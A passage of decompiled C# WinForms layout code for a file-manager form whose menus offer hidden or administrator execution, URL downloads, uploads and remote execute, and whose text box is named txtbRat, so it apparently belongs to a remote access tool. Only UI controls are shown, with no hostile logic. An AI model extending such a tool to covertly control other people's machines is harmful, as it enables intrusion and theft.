		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(FMGR));
		TreeNode val = new TreeNode("Desktop", 0, 0);
		TreeNode val2 = new TreeNode("Downloads", 5, 5);
		TreeNode val3 = new TreeNode("Documents", 4, 4);
		TreeNode val4 = new TreeNode("Favorite", 2, 2);
		TreeNode val5 = new TreeNode("Pictures", 8, 8);
		TreeNode val6 = new TreeNode("Startup", 1, 1);
		TreeNode val7 = new TreeNode("AppData", 1, 1);
		TreeNode val8 = new TreeNode("Temp", 3, 3);
		TreeNode val9 = new TreeNode("Quick Access", 7, 7, (TreeNode[])(object)new TreeNode[8] { val, val2, val3, val4, val5, val6, val7, val8 });
		TreeNode val10 = new TreeNode("My Computer", 6, 6);
		ContextMenuStrip1 = new ContextMenuStrip(components);
		RunToolStripMenuItem = new ToolStripMenuItem();
		NormalToolStripMenuItem = new ToolStripMenuItem();
		HiddenToolStripMenuItem = new ToolStripMenuItem();
		AsAdministratorToolStripMenuItem = new ToolStripMenuItem();
		ViewToolStripMenuItem = new ToolStripMenuItem();
		DetailsToolStripMenuItem = new ToolStripMenuItem();
		LargeToolStripMenuItem = new ToolStripMenuItem();
		TitleToolStripMenuItem = new ToolStripMenuItem();
		TToolStripMenuItem = new ToolStripMenuItem();
		ViewPhotoToolStripMenuItem = new ToolStripMenuItem();
		BackToolStripMenuItem = new ToolStripMenuItem();
		RefreshToolStripMenuItem = new ToolStripMenuItem();
		CopyFilePathToolStripMenuItem = new ToolStripMenuItem();
		ReadTextFileToolStripMenuItem = new ToolStripMenuItem();
		RenameToolStripMenuItem = new ToolStripMenuItem();
		DeleteToolStripMenuItem = new ToolStripMenuItem();
		ThumbnailsToolStripMenuItem = new ToolStripMenuItem();
		DiscoverRarFileToolStripMenuItem = new ToolStripMenuItem();
		DownloadViaUrlToolStripMenuItem = new ToolStripMenuItem();
		DownloadToolStripMenuItem = new ToolStripMenuItem();
		UploadToolStripMenuItem = new ToolStripMenuItem();
		PropertiesToolStripMenuItem = new ToolStripMenuItem();
		ImageList2 = new ImageList(components);
		ContextMenuStrip3 = new ContextMenuStrip(components);
		ExecuteToolStripMenuItem = new ToolStripMenuItem();
		DownloadToolStripMenuItem1 = new ToolStripMenuItem();
		ContextMenuStrip2 = new ContextMenuStrip(components);
		StopToolStripMenuItem = new ToolStripMenuItem();
		SuspendToolStripMenuItem = new ToolStripMenuItem();
		ContinueToolStripMenuItem = new ToolStripMenuItem();
		RemoveAllCompletedToolStripMenuItem = new ToolStripMenuItem();
		OpenDownloadFolderToolStripMenuItem = new ToolStripMenuItem();
		ImageList1 = new ImageList(components);
		ImageList3 = new ImageList(components);
		ImageList4 = new ImageList(components);
		EtherealTabControl1 = new EtherealTabControl();
		TabPage1 = new TabPage();
		Panel3 = new Panel();
		StatusStrip1 = new StatusStrip();
		ToolStripStatusLabel4 = new ToolStripStatusLabel();
		ToolStripStatusLabel3 = new ToolStripStatusLabel();
		ToolStripStatusLabel2 = new ToolStripStatusLabel();
		ToolStripStatusLabel1 = new ToolStripStatusLabel();
		listFiles = new ListView();
		ColumnHeader6 = new ColumnHeader();
		ColumnHeader7 = new ColumnHeader();
		ColumnHeader8 = new ColumnHeader();
		ColumnHeader9 = new ColumnHeader();
		ColumnHeader10 = new ColumnHeader();
		ColumnHeader11 = new ColumnHeader();
		Panel2 = new Panel();
		quikacc = new TreeView();
		Panel1 = new Panel();
		pathRefr = new Button();
		LocatPath = new TextBox();
		pathEntr = new Button();
		TabPage2 = new TabPage();
		Panel7 = new Panel();
		listSearchFiles = new ListView();
		ColumnHeader12 = new ColumnHeader();
		ColumnHeader13 = new ColumnHeader();
		Panel6 = new Panel();
		StopSearc = new Button();
		SearchPath = new TextBox();
		Label1 = new Label();
		Label2 = new Label();
		StartSearc = new Button();
		SearcFileName = new TextBox();
		StatusStrip2 = new StatusStrip();
		ToolStripStatusLabel8 = new ToolStripStatusLabel();
		ToolStripStatusLabel5 = new ToolStripStatusLabel();
		TabPage3 = new TabPage();
		listThumb = new ListView();
		StatusStrip3 = new StatusStrip();
		ToolStripStatusLabel6 = new ToolStripStatusLabel();
		TabPage4 = new TabPage();
		listDownloads = new ListView();
		ColumnHeader1 = new ColumnHeader();
		ColumnHeader2 = new ColumnHeader();
		ColumnHeader3 = new ColumnHeader();
		ColumnHeader4 = new ColumnHeader();
		ColumnHeader5 = new ColumnHeader();
		TabPage6 = new TabPage();
		Panel5 = new Panel();
		txtbRat = new TextBox();
		Panel4 = new Panel();
		Label3 = new Label();
		redSave = new Button();
		reTextPath = new TextBox();
		readGo = new Button();
		StatusStrip4 = new StatusStrip();
		ToolStripStatusLabel7 = new ToolStripStatusLabel();
		((Control)ContextMenuStrip1).SuspendLayout();
		((Control)ContextMenuStrip3).SuspendLayout();
		((Control)ContextMenuStrip2).SuspendLayout();
		((Control)EtherealTabControl1).SuspendLayout();
		((Control)TabPage1).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((Control)StatusStrip1).SuspendLayout();
		((Control)Panel2).SuspendLayout();
		((Control)Panel1).SuspendLayout();
		((Control)TabPage2).SuspendLayout();
		((Control)Panel7).SuspendLayout();
		((Control)Panel6).SuspendLayout();
		((Control)StatusStrip2).SuspendLayout();
		((Control)TabPage3).SuspendLayout();
		((Control)StatusStrip3).SuspendLayout();
		((Control)TabPage4).SuspendLayout();
		((Control)TabPage6).SuspendLayout();
		((Control)Panel5).SuspendLayout();
		((Control)Panel4).SuspendLayout();
		((Control)StatusStrip4).SuspendLayout();
		((Control)this).SuspendLayout();
		((ToolStrip)ContextMenuStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[15]
		{
			(ToolStripItem)RunToolStripMenuItem,
			(ToolStripItem)ViewToolStripMenuItem,
			(ToolStripItem)ViewPhotoToolStripMenuItem,
			(ToolStripItem)BackToolStripMenuItem,
			(ToolStripItem)RefreshToolStripMenuItem,
			(ToolStripItem)CopyFilePathToolStripMenuItem,
			(ToolStripItem)ReadTextFileToolStripMenuItem,
			(ToolStripItem)RenameToolStripMenuItem,
			(ToolStripItem)DeleteToolStripMenuItem,
			(ToolStripItem)ThumbnailsToolStripMenuItem,
			(ToolStripItem)DiscoverRarFileToolStripMenuItem,
			(ToolStripItem)DownloadViaUrlToolStripMenuItem,
			(ToolStripItem)DownloadToolStripMenuItem,
			(ToolStripItem)UploadToolStripMenuItem,
			(ToolStripItem)PropertiesToolStripMenuItem
		});
		((Control)ContextMenuStrip1).set_Name("ContextMenuStrip1");
		ContextMenuStrip contextMenuStrip = ContextMenuStrip1;
		Size size = new Size(190, 334);
		((Control)contextMenuStrip).set_Size(size);
		((ToolStripDropDownItem)RunToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)NormalToolStripMenuItem,
			(ToolStripItem)HiddenToolStripMenuItem,
			(ToolStripItem)AsAdministratorToolStripMenuItem
		});
		((ToolStripItem)RunToolStripMenuItem).set_Image((Image)(object)Resources._1484771590_Go);
		((ToolStripItem)RunToolStripMenuItem).set_Name("RunToolStripMenuItem");
		ToolStripMenuItem runToolStripMenuItem = RunToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)runToolStripMenuItem).set_Size(size);
		((ToolStripItem)RunToolStripMenuItem).set_Text("Run");
		((ToolStripItem)NormalToolStripMenuItem).set_Image((Image)(object)Resources._1484771706_application);
		((ToolStripItem)NormalToolStripMenuItem).set_Name("NormalToolStripMenuItem");
		ToolStripMenuItem normalToolStripMenuItem = NormalToolStripMenuItem;
		size = new Size(163, 22);
		((ToolStripItem)normalToolStripMenuItem).set_Size(size);
		((ToolStripItem)NormalToolStripMenuItem).set_Text("Normal");
		((ToolStripItem)HiddenToolStripMenuItem).set_Image((Image)(object)Resources._1484771857_view_content_window);
		((ToolStripItem)HiddenToolStripMenuItem).set_Name("HiddenToolStripMenuItem");
		ToolStripMenuItem hiddenToolStripMenuItem = HiddenToolStripMenuItem;
		size = new Size(163, 22);
		((ToolStripItem)hiddenToolStripMenuItem).set_Size(size);
		((ToolStripItem)HiddenToolStripMenuItem).set_Text("Hidden");
		((ToolStripItem)AsAdministratorToolStripMenuItem).set_Image((Image)(object)Resources._039);
		((ToolStripItem)AsAdministratorToolStripMenuItem).set_Name("AsAdministratorToolStripMenuItem");
		ToolStripMenuItem asAdministratorToolStripMenuItem = AsAdministratorToolStripMenuItem;
		size = new Size(163, 22);
		((ToolStripItem)asAdministratorToolStripMenuItem).set_Size(size);
		((ToolStripItem)AsAdministratorToolStripMenuItem).set_Text("As Administrator");
		((ToolStripDropDownItem)ViewToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)DetailsToolStripMenuItem,
			(ToolStripItem)LargeToolStripMenuItem,
			(ToolStripItem)TitleToolStripMenuItem,
			(ToolStripItem)TToolStripMenuItem
		});
		((ToolStripItem)ViewToolStripMenuItem).set_Image((Image)(object)Resources._1484770751_application_view_icons);
		((ToolStripItem)ViewToolStripMenuItem).set_Name("ViewToolStripMenuItem");
		ToolStripMenuItem viewToolStripMenuItem = ViewToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)viewToolStripMenuItem).set_Size(size);
		((ToolStripItem)ViewToolStripMenuItem).set_Text("View");
		DetailsToolStripMenuItem.set_Checked(true);
		DetailsToolStripMenuItem.set_CheckState((CheckState)1);
		((ToolStripItem)DetailsToolStripMenuItem).set_Name("DetailsToolStripMenuItem");
		ToolStripMenuItem detailsToolStripMenuItem = DetailsToolStripMenuItem;
		size = new Size(109, 22);
		((ToolStripItem)detailsToolStripMenuItem).set_Size(size);
		((ToolStripItem)DetailsToolStripMenuItem).set_Text("Details");
		((ToolStripItem)LargeToolStripMenuItem).set_Name("LargeToolStripMenuItem");
		ToolStripMenuItem largeToolStripMenuItem = LargeToolStripMenuItem;
		size = new Size(109, 22);
		((ToolStripItem)largeToolStripMenuItem).set_Size(size);
		((ToolStripItem)LargeToolStripMenuItem).set_Text("Large");
		((ToolStripItem)TitleToolStripMenuItem).set_Name("TitleToolStripMenuItem");
		ToolStripMenuItem titleToolStripMenuItem = TitleToolStripMenuItem;
		size = new Size(109, 22);
		((ToolStripItem)titleToolStripMenuItem).set_Size(size);
		((ToolStripItem)TitleToolStripMenuItem).set_Text("Title");
		((ToolStripItem)TToolStripMenuItem).set_Name("TToolStripMenuItem");
		ToolStripMenuItem tToolStripMenuItem = TToolStripMenuItem;
		size = new Size(109, 22);
		((ToolStripItem)tToolStripMenuItem).set_Size(size);
		((ToolStripItem)TToolStripMenuItem).set_Text("List");
		((ToolStripItem)ViewPhotoToolStripMenuItem).set_Image((Image)(object)Resources.Camera_icon);
		((ToolStripItem)ViewPhotoToolStripMenuItem).set_Name("ViewPhotoToolStripMenuItem");
		ToolStripMenuItem viewPhotoToolStripMenuItem = ViewPhotoToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)viewPhotoToolStripMenuItem).set_Size(size);
		((ToolStripItem)ViewPhotoToolStripMenuItem).set_Text("View Photo");
		((ToolStripItem)BackToolStripMenuItem).set_Image((Image)(object)Resources._1484771505_go_back);
		((ToolStripItem)BackToolStripMenuItem).set_Name("BackToolStripMenuItem");
		ToolStripMenuItem backToolStripMenuItem = BackToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)backToolStripMenuItem).set_Size(size);
		((ToolStripItem)BackToolStripMenuItem).set_Text("Back");
		((ToolStripItem)RefreshToolStripMenuItem).set_Image((Image)(object)Resources._1484770668_Gnome_View_Refresh_32);
		((ToolStripItem)RefreshToolStripMenuItem).set_Name("RefreshToolStripMenuItem");
		ToolStripMenuItem refreshToolStripMenuItem = RefreshToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)refreshToolStripMenuItem).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem).set_Text("Refresh");
		((ToolStripItem)CopyFilePathToolStripMenuItem).set_Image((Image)(object)Resources._1484785664_clipboard_sign_out);
		((ToolStripItem)CopyFilePathToolStripMenuItem).set_Name("CopyFilePathToolStripMenuItem");
		ToolStripMenuItem copyFilePathToolStripMenuItem = CopyFilePathToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)copyFilePathToolStripMenuItem).set_Size(size);
		((ToolStripItem)CopyFilePathToolStripMenuItem).set_Text("Copy file path");
		((ToolStripItem)ReadTextFileToolStripMenuItem).set_Image((Image)(object)Resources._1487513521_resolutions_05);
		((ToolStripItem)ReadTextFileToolStripMenuItem).set_Name("ReadTextFileToolStripMenuItem");
		ToolStripMenuItem readTextFileToolStripMenuItem = ReadTextFileToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)readTextFileToolStripMenuItem).set_Size(size);
		((ToolStripItem)ReadTextFileToolStripMenuItem).set_Text("Read Text File");
		((ToolStripItem)RenameToolStripMenuItem).set_Image((Image)(object)Resources._1484770853_Rename_Document);
		((ToolStripItem)RenameToolStripMenuItem).set_Name("RenameToolStripMenuItem");
		ToolStripMenuItem renameToolStripMenuItem = RenameToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)renameToolStripMenuItem).set_Size(size);
		((ToolStripItem)RenameToolStripMenuItem).set_Text("Rename");
		((ToolStripItem)DeleteToolStripMenuItem).set_Image((Image)(object)Resources._1484771038_edit_delete);
		((ToolStripItem)DeleteToolStripMenuItem).set_Name("DeleteToolStripMenuItem");
		ToolStripMenuItem deleteToolStripMenuItem = DeleteToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)deleteToolStripMenuItem).set_Size(size);
		((ToolStripItem)DeleteToolStripMenuItem).set_Text("Delete");
		((ToolStripItem)ThumbnailsToolStripMenuItem).set_Image((Image)(object)Resources._1484771438_thumbnail);
		((ToolStripItem)ThumbnailsToolStripMenuItem).set_Name("ThumbnailsToolStripMenuItem");
		ToolStripMenuItem thumbnailsToolStripMenuItem = ThumbnailsToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)thumbnailsToolStripMenuItem).set_Size(size);
		((ToolStripItem)ThumbnailsToolStripMenuItem).set_Text("Thumbnails");
		((ToolStripItem)DiscoverRarFileToolStripMenuItem).set_Image((Image)(object)Resources._1487271593_rar);
		((ToolStripItem)DiscoverRarFileToolStripMenuItem).set_Name("DiscoverRarFileToolStripMenuItem");
		ToolStripMenuItem discoverRarFileToolStripMenuItem = DiscoverRarFileToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)discoverRarFileToolStripMenuItem).set_Size(size);
		((ToolStripItem)DiscoverRarFileToolStripMenuItem).set_Text("Discover Rar file");
		((ToolStripItem)DownloadViaUrlToolStripMenuItem).set_Image((Image)(object)Resources._1484771374_icon_129_cloud_download);
		((ToolStripItem)DownloadViaUrlToolStripMenuItem).set_Name("DownloadViaUrlToolStripMenuItem");
		ToolStripMenuItem downloadViaUrlToolStripMenuItem = DownloadViaUrlToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)downloadViaUrlToolStripMenuItem).set_Size(size);
		((ToolStripItem)DownloadViaUrlToolStripMenuItem).set_Text("Download file via URL");
		((ToolStripItem)DownloadToolStripMenuItem).set_Image((Image)(object)Resources._1484771140_ark2);
		((ToolStripItem)DownloadToolStripMenuItem).set_Name("DownloadToolStripMenuItem");
		ToolStripMenuItem downloadToolStripMenuItem = DownloadToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)downloadToolStripMenuItem).set_Size(size);
		((ToolStripItem)DownloadToolStripMenuItem).set_Text("Download ");
		((ToolStripItem)UploadToolStripMenuItem).set_Image((Image)(object)Resources._1484771209_inbox_upload);
		((ToolStripItem)UploadToolStripMenuItem).set_Name("UploadToolStripMenuItem");
		ToolStripMenuItem uploadToolStripMenuItem = UploadToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)uploadToolStripMenuItem).set_Size(size);
		((ToolStripItem)UploadToolStripMenuItem).set_Text("Upload");
		((ToolStripItem)PropertiesToolStripMenuItem).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((ToolStripItem)PropertiesToolStripMenuItem).set_Image((Image)(object)Resources.document_properties_icon);
		((ToolStripItem)PropertiesToolStripMenuItem).set_Name("PropertiesToolStripMenuItem");
		ToolStripMenuItem propertiesToolStripMenuItem = PropertiesToolStripMenuItem;
		size = new Size(189, 22);
		((ToolStripItem)propertiesToolStripMenuItem).set_Size(size);
		((ToolStripItem)PropertiesToolStripMenuItem).set_Text("Properties");
		ImageList2.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList2.ImageStream"));
		ImageList2.set_TransparentColor(Color.Transparent);
		ImageList2.get_Images().SetKeyName(0, "Desktop-icon.png");
		ImageList2.get_Images().SetKeyName(1, "folder-close-icon.png");
		ImageList2.get_Images().SetKeyName(2, "folder-fav-icon.png");
		ImageList2.get_Images().SetKeyName(3, "folder-subfolder-icon.png");
		ImageList2.get_Images().SetKeyName(4, "folder-documents-icon.png");
		ImageList2.get_Images().SetKeyName(5, "folder-download-icon.png");
		ImageList2.get_Images().SetKeyName(6, "Portable-Computer-icon.png");
		ImageList2.get_Images().SetKeyName(7, "star-rating-icon.png");
		ImageList2.get_Images().SetKeyName(8, "folder-public-pictures-icon.png");
		ImageList2.get_Images().SetKeyName(9, "drive-win-icon (1).png");
		ImageList2.get_Images().SetKeyName(10, "drive-icon.png");
		ImageList2.get_Images().SetKeyName(11, "Drive-DVD-icon.png");
		ImageList2.get_Images().SetKeyName(12, "drive-network-icon.png");
		ImageList2.get_Images().SetKeyName(13, "149.png");
		ImageList2.get_Images().SetKeyName(14, "drive-usb-icon.png");
		ImageList2.get_Images().SetKeyName(15, "1484856148_Folder.png");
		ImageList2.get_Images().SetKeyName(16, "1484856202_free-12.png");
		((ToolStrip)ContextMenuStrip3).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)ExecuteToolStripMenuItem,
			(ToolStripItem)DownloadToolStripMenuItem1
		});
		((Control)ContextMenuStrip3).set_Name("ContextMenuStrip3");
		ContextMenuStrip contextMenuStrip2 = ContextMenuStrip3;
		size = new Size(129, 48);
		((Control)contextMenuStrip2).set_Size(size);
		((ToolStripItem)ExecuteToolStripMenuItem).set_Image((Image)(object)Resources._1484771590_Go);
		((ToolStripItem)ExecuteToolStripMenuItem).set_Name("ExecuteToolStripMenuItem");
		ToolStripMenuItem executeToolStripMenuItem = ExecuteToolStripMenuItem;
		size = new Size(128, 22);
		((ToolStripItem)executeToolStripMenuItem).set_Size(size);
		((ToolStripItem)ExecuteToolStripMenuItem).set_Text("Execute");
		((ToolStripItem)DownloadToolStripMenuItem1).set_Image((Image)(object)Resources._1484771140_ark2);
		((ToolStripItem)DownloadToolStripMenuItem1).set_Name("DownloadToolStripMenuItem1");
		ToolStripMenuItem downloadToolStripMenuItem2 = DownloadToolStripMenuItem1;
		size = new Size(128, 22);
		((ToolStripItem)downloadToolStripMenuItem2).set_Size(size);
		((ToolStripItem)DownloadToolStripMenuItem1).set_Text("Download");
		((ToolStrip)ContextMenuStrip2).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[5]
		{
			(ToolStripItem)StopToolStripMenuItem,
			(ToolStripItem)SuspendToolStripMenuItem,
			(ToolStripItem)ContinueToolStripMenuItem,
			(ToolStripItem)RemoveAllCompletedToolStripMenuItem,
			(ToolStripItem)OpenDownloadFolderToolStripMenuItem
		});
		((Control)ContextMenuStrip2).set_Name("ContextMenuStrip2");
		ContextMenuStrip contextMenuStrip3 = ContextMenuStrip2;
		size = new Size(197, 114);
		((Control)contextMenuStrip3).set_Size(size);
		((ToolStripItem)StopToolStripMenuItem).set_Image((Image)(object)Resources._1484772282_Stop1NormalRed);
		((ToolStripItem)StopToolStripMenuItem).set_Name("StopToolStripMenuItem");
		ToolStripMenuItem stopToolStripMenuItem = StopToolStripMenuItem;
		size = new Size(196, 22);
		((ToolStripItem)stopToolStripMenuItem).set_Size(size);
		((ToolStripItem)StopToolStripMenuItem).set_Text("Stop");
		((ToolStripItem)SuspendToolStripMenuItem).set_Image((Image)(object)Resources._1484772391_player_pause);
		((ToolStripItem)SuspendToolStripMenuItem).set_Name("SuspendToolStripMenuItem");
		ToolStripMenuItem suspendToolStripMenuItem = SuspendToolStripMenuItem;
		size = new Size(196, 22);
		((ToolStripItem)suspendToolStripMenuItem).set_Size(size);
		((ToolStripItem)SuspendToolStripMenuItem).set_Text("Suspend");
		((ToolStripItem)ContinueToolStripMenuItem).set_Image((Image)(object)Resources._1484772428_tool_resume);
		((ToolStripItem)ContinueToolStripMenuItem).set_Name("ContinueToolStripMenuItem");
		ToolStripMenuItem continueToolStripMenuItem = ContinueToolStripMenuItem;
		size = new Size(196, 22);
		((ToolStripItem)continueToolStripMenuItem).set_Size(size);
		((ToolStripItem)ContinueToolStripMenuItem).set_Text("Continue");
		((ToolStripItem)RemoveAllCompletedToolStripMenuItem).set_Image((Image)(object)Resources._1484772170_DeleteRed);
		((ToolStripItem)RemoveAllCompletedToolStripMenuItem).set_Name("RemoveAllCompletedToolStripMenuItem");
		ToolStripMenuItem removeAllCompletedToolStripMenuItem = RemoveAllCompletedToolStripMenuItem;
		size = new Size(196, 22);
		((ToolStripItem)removeAllCompletedToolStripMenuItem).set_Size(size);
		((ToolStripItem)RemoveAllCompletedToolStripMenuItem).set_Text("Remove All Completed");
		((ToolStripItem)OpenDownloadFolderToolStripMenuItem).set_Image((Image)(object)Resources.rsz_001);
		((ToolStripItem)OpenDownloadFolderToolStripMenuItem).set_Name("OpenDownloadFolderToolStripMenuItem");
		ToolStripMenuItem openDownloadFolderToolStripMenuItem = OpenDownloadFolderToolStripMenuItem;
		size = new Size(196, 22);
		((ToolStripItem)openDownloadFolderToolStripMenuItem).set_Size(size);
		((ToolStripItem)OpenDownloadFolderToolStripMenuItem).set_Text("Open Download Folder");
		ImageList1.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList1.ImageStream"));
		ImageList1.set_TransparentColor(Color.Transparent);
		ImageList1.get_Images().SetKeyName(0, "1484859537_multimedia-37.png");
		ImageList1.get_Images().SetKeyName(1, "search.png");
		ImageList1.get_Images().SetKeyName(2, "thumbnails.png");
		ImageList1.get_Images().SetKeyName(3, "transfertfile.png");
		ImageList1.get_Images().SetKeyName(4, "1484859632_read.png");
		ImageList3.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList3.ImageStream"));
		ImageList3.set_TransparentColor(Color.Transparent);
		ImageList3.get_Images().SetKeyName(0, "1484856148_Folder.png");
		ImageList3.get_Images().SetKeyName(1, "1484856202_free-12.png");
		ImageList4.set_ColorDepth((ColorDepth)32);
		ImageList imageList = ImageList4;
		size = new Size(150, 150);
		imageList.set_ImageSize(size);
		ImageList4.set_TransparentColor(Color.White);
		((TabControl)EtherealTabControl1).set_Alignment((TabAlignment)2);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage1);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage2);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage3);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage4);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage6);
		((Control)EtherealTabControl1).set_Dock((DockStyle)5);
		((TabControl)EtherealTabControl1).set_ImageList(ImageList1);
		EtherealTabControl etherealTabControl = EtherealTabControl1;
		size = new Size(40, 150);
		((TabControl)etherealTabControl).set_ItemSize(size);
		EtherealTabControl etherealTabControl2 = EtherealTabControl1;
		Point location = new Point(0, 0);
		((Control)etherealTabControl2).set_Location(location);
		((TabControl)EtherealTabControl1).set_Multiline(true);
		((Control)EtherealTabControl1).set_Name("EtherealTabControl1");
		((TabControl)EtherealTabControl1).set_SelectedIndex(0);
		EtherealTabControl etherealTabControl3 = EtherealTabControl1;
		size = new Size(852, 386);
		((Control)etherealTabControl3).set_Size(size);
		((TabControl)EtherealTabControl1).set_SizeMode((TabSizeMode)2);
		((Control)EtherealTabControl1).set_TabIndex(0);
		((Control)TabPage1).get_Controls().Add((Control)(object)Panel3);
		((Control)TabPage1).get_Controls().Add((Control)(object)Panel2);
		((Control)TabPage1).get_Controls().Add((Control)(object)Panel1);
		TabPage tabPage = TabPage1;
		location = new Point(154, 4);
		tabPage.set_Location(location);
		((Control)TabPage1).set_Name("TabPage1");
		TabPage tabPage2 = TabPage1;
		Padding padding = default(Padding);
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage2).set_Padding(padding);
		TabPage tabPage3 = TabPage1;
		size = new Size(694, 378);
		((Control)tabPage3).set_Size(size);
		TabPage1.set_TabIndex(0);
		TabPage1.set_Text("My Computer");
		TabPage1.set_UseVisualStyleBackColor(true);
		((Control)Panel3).get_Controls().Add((Control)(object)StatusStrip1);
		((Control)Panel3).get_Controls().Add((Control)(object)listFiles);
		((Control)Panel3).set_Dock((DockStyle)5);
		Panel panel = Panel3;
		location = new Point(203, 41);
		((Control)panel).set_Location(location);
		((Control)Panel3).set_Name("Panel3");
		Panel panel2 = Panel3;
		size = new Size(488, 334);
		((Control)panel2).set_Size(size);
		((Control)Panel3).set_TabIndex(4);
		((ToolStrip)StatusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)ToolStripStatusLabel4,
			(ToolStripItem)ToolStripStatusLabel3,
			(ToolStripItem)ToolStripStatusLabel2,
			(ToolStripItem)ToolStripStatusLabel1
		});
		StatusStrip statusStrip = StatusStrip1;
		location = new Point(0, 312);
		((Control)statusStrip).set_Location(location);
		((Control)StatusStrip1).set_Name("StatusStrip1");
		StatusStrip statusStrip2 = StatusStrip1;
		size = new Size(488, 22);
		((Control)statusStrip2).set_Size(size);
		((Control)StatusStrip1).set_TabIndex(0);
		((Control)StatusStrip1).set_Text("StatusStrip1");
		((ToolStripItem)ToolStripStatusLabel4).set_Name("ToolStripStatusLabel4");
		ToolStripStatusLabel toolStripStatusLabel = ToolStripStatusLabel4;
		size = new Size(17, 17);
		((ToolStripItem)toolStripStatusLabel).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel4).set_Text("--");
		((ToolStripItem)ToolStripStatusLabel3).set_Name("ToolStripStatusLabel3");
		ToolStripStatusLabel toolStripStatusLabel2 = ToolStripStatusLabel3;
		size = new Size(17, 17);
		((ToolStripItem)toolStripStatusLabel2).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel3).set_Text("--");
		((ToolStripItem)ToolStripStatusLabel2).set_Name("ToolStripStatusLabel2");
		ToolStripStatusLabel toolStripStatusLabel3 = ToolStripStatusLabel2;
		size = new Size(17, 17);
		((ToolStripItem)toolStripStatusLabel3).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel2).set_Text("--");
		((ToolStripItem)ToolStripStatusLabel1).set_Name("ToolStripStatusLabel1");
		ToolStripStatusLabel toolStripStatusLabel4 = ToolStripStatusLabel1;
		size = new Size(17, 17);
		((ToolStripItem)toolStripStatusLabel4).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel1).set_Text("--");
		listFiles.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[6] { ColumnHeader6, ColumnHeader7, ColumnHeader8, ColumnHeader9, ColumnHeader10, ColumnHeader11 });
		((Control)listFiles).set_ContextMenuStrip(ContextMenuStrip1);
		((Control)listFiles).set_Dock((DockStyle)5);
		((Control)listFiles).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		listFiles.set_FullRowSelect(true);
		listFiles.set_GridLines(true);
		listFiles.set_LargeImageList(ImageList3);
		ListView obj = listFiles;
		location = new Point(0, 0);
		((Control)obj).set_Location(location);
		((Control)listFiles).set_Name("listFiles");
		ListView obj2 = listFiles;
		size = new Size(488, 334);
		((Control)obj2).set_Size(size);
		listFiles.set_SmallImageList(ImageList3);
		((Control)listFiles).set_TabIndex(3);
		listFiles.set_UseCompatibleStateImageBehavior(false);
		listFiles.set_View((View)1);
		ColumnHeader6.set_Text("Name");
		ColumnHeader6.set_Width(97);
		ColumnHeader7.set_Text("Size");
		ColumnHeader7.set_Width(76);
		ColumnHeader8.set_Text("Type");
		ColumnHeader9.set_Text("Creation Date");
		ColumnHeader9.set_Width(88);
		ColumnHeader10.set_Text("Last Access");
		ColumnHeader10.set_Width(88);
		ColumnHeader11.set_Text("Last Update");
		ColumnHeader11.set_Width(137);
		((Control)Panel2).get_Controls().Add((Control)(object)quikacc);
		((Control)Panel2).set_Dock((DockStyle)3);
		Panel panel3 = Panel2;
		location = new Point(3, 41);
		((Control)panel3).set_Location(location);
		((Control)Panel2).set_Name("Panel2");
		Panel panel4 = Panel2;
		size = new Size(200, 334);
		((Control)panel4).set_Size(size);
		((Control)Panel2).set_TabIndex(3);
		((Control)quikacc).set_Dock((DockStyle)5);
		((Control)quikacc).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		quikacc.set_ImageIndex(8);
		quikacc.set_ImageList(ImageList2);
		TreeView obj3 = quikacc;
		location = new Point(0, 0);
		((Control)obj3).set_Location(location);
		((Control)quikacc).set_Name("quikacc");
		val.set_ImageIndex(0);
		val.set_Name("Node2");
		val.set_SelectedImageIndex(0);
		val.set_Text("Desktop");
		val2.set_ImageIndex(5);
		val2.set_Name("Node3");
		val2.set_SelectedImageIndex(5);
		val2.set_Text("Downloads");
		val3.set_ImageIndex(4);
		val3.set_Name("Node14");
		val3.set_SelectedImageIndex(4);
		val3.set_Text("Documents");
		val4.set_ImageIndex(2);
		val4.set_Name("Node15");
		val4.set_SelectedImageIndex(2);
		val4.set_Text("Favorite");
